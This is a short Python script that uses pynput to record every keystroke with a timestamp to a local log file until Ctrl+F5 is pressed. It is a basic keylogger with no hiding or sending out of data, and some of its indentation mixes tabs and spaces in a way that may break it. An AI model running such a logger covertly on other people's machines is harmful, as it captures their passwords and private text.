import pynput
import os
import time
from pynput.keyboard import Key, Listener

log_file = os.environ.get('pylogger_file',os.path.expanduser('~/elems.log'))

is_ctrl = False


def press_elem(event):
    event = str(event)
    check = event.find('Key')
    if check != -1:
	  	  event = event.replace('Key.', '')
    with open(log_file, 'a+') as f:
        f.write('{}-'.format(event))
        f.write('{}\n'.format(time.time()))


def release_elem(event):
    global is_ctrl
    if event == Key.ctrl_l:
        is_ctrl = True
    if event != Key.ctrl_l and event != Key.f5:
        is_ctrl = False
    if event == Key.f5 and is_ctrl:
        return False    


if __name__ == '__main__':
    with open(log_file, 'a+') as ft:
	  	  ft.write('{}\n'.format(time.ctime()))
    with Listener(on_press = press_elem, on_release = release_elem) as listener:
	  	  listener.join()